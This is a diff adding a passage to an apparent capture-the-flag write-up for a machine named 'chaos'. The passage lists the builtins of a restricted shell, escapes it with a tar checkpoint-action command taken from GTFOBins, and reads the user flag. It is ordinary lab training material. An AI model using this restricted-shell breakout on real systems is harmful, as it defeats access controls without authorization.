@@ -615,3 +615,55 @@ rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command nam
 Let's go! It worked! But there is a `problem`, as the ayush `shell` is apparently `restricted`.
 
 <br />
+
+Click <TAB> to see the commands that we can run:
+
+<br />
+
+```bash
+ayush@chaos:/home$ 
+!                         caller                    disown                    fc                        let                       select                    type
+./                        case                      do                        fg                        local                     set                       typeset
+:                         cd                        done                      fi                        logout                    shift                     ulimit
+[                         command                   echo                      for                       mapfile                   shopt                     umask
+[[                        command_not_found_handle  elif                      function                  ping                      source                    unalias
+]]                        compgen                   else                      getopts                   popd                      suspend                   unset
+{                         complete                  enable                    hash                      printf                    tar                       until
+}                         compopt                   esac                      help                      pushd                     test                      wait
+alias                     continue                  eval                      history                   pwd                       then                      while
+bg                        coproc                    exec                      if                        read                      time                      
+bind                      declare                   exit                      in                        readarray                 times                     
+break                     dir                       export                    jobs                      readonly                  trap                      
+builtin                   dirs                      false                     kill                      return                    true   
+```
+
+<br />
+
+Searching in [GTFOBins](https://gtfobins.github.io/) I discover that we can break out the restricted shell:
+
+<br />
+
+```bash
+ayush@chaos:/home$ tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+$ ls
+/bin/sh: 1: ls: not found
+$ echo $PATH
+/home/ayush/.app
+$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+$ cd /home/ayush
+$ cat user.txt
+3e22294dc16a936e506615b4eaxxxxxx
+```
+
+<br />
+
+Perfect!! We have the user.txt flag!!
+
+<br />
+
+# Privilege Escalation: ayush -> root
+
+<br />
+
+
